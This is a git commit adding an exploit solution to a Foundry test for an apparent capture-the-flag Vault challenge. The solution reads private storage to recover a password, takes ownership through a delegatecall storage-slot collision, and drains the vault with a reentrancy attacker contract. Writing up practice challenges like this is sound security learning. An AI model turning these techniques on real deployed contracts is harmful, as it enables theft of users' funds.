1b7c7c2d572f09a26475300fb1564d49bdf46a69
Floydwish <my0127912@hotmail.com>
2025-10-20 16:54:08 +0800

    Update

--- test/Vault.t.sol
+++ test/Vault.t.sol
@@ -5,7 +5,25 @@ import "forge-std/Test.sol";
 import "../src/Vault.sol";
 
 
-
+contract TestAttacker {
+    Vault public vault;
+    
+    constructor(Vault _vault) {
+        vault = _vault;
+    }
+    
+    function attack() external payable {
+        vault.deposite{value: msg.value}();
+        vault.withdraw();
+        payable(msg.sender).transfer(address(this).balance);
+    }
+    
+    receive() external payable {
+        if (address(vault).balance > 0) {
+            vault.withdraw();
+        }
+    }
+}
 
 contract VaultExploiter is Test {
     Vault public vault;
@@ -31,9 +49,34 @@ contract VaultExploiter is Test {
         vm.startPrank(palyer);
 
         // add your hacker code.
+        // 1.slot 布局：vault 合约 delegatecall 调用 vaultLogic 的 changeOwner 时，
+        // 检查的 slot 1, slot 1 对应的是 vaultLogic 合约地址
+        // 2.密码获取：读取 vault 合约的 slot 1, 得到 vaultLogic 合约地址, 也就是密码
+        // 3.修改 owner
+        // 4.提款 + 重入
+        bytes32 logicSlot = vm.load(address(vault), bytes32(uint256(1)));
+        address logicAddr = address(uint160(uint256(logicSlot)));
+        bytes32 password = bytes32(uint256(uint160(logicAddr)));
+        
+        (bool success,) = address(vault).call(
+            abi.encodeWithSignature("changeOwner(bytes32,address)", password, palyer)
+        );
+        require(success, "changeOwner failed");
+        
+        // 2. 开启提款（此时 owner 已经是 player)
+        vault.openWithdraw();
+        
+        // 3. 部署攻击合约并提款（在提款时重入)
+        // 重入原因：vault 合约先发送 eth, 再更新值
+        TestAttacker attacker = new TestAttacker(vault);
+        attacker.attack{value: 0.01 ether}();
 
         require(vault.isSolve(), "solved");
         vm.stopPrank();
     }
 
 }
+
+
+
+
